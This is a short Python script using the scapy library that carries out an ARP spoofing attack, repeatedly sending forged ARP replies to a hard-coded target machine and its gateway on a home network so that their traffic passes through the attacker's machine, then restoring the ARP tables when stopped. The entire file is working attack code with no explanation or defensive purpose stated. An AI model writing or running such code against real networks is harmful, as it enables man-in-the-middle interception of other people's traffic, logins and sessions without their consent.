from scapy.all import *

def spoof(targetip, targetmac, sourceip):
    spoofed = ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
    send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
    packet = ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)

def main():
    targetip = "192.168.0.24"
    gatewayip = "192.168.0.1"
    targetmac = "a4:5e:60:b9:d6:ab"
    gatewaymac = "9c:c9:eb:c9:1a:1a"

    try:
        print("Sending spoofed ARP responses")
        #restorearp(gatewayip, gatewaymac, targetip, targetmac)
        #restorearp(targetip, targetmac, gatewayip, gatewaymac)
        while True:
            spoof(targetip, targetmac, gatewayip)
            spoof(gatewayip, gatewaymac, targetip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        restorearp(gatewayip, gatewaymac, targetip, targetmac)
        restorearp(targetip, targetmac, gatewayip, gatewaymac)
        quit()

if __name__=="__main__":
    main()
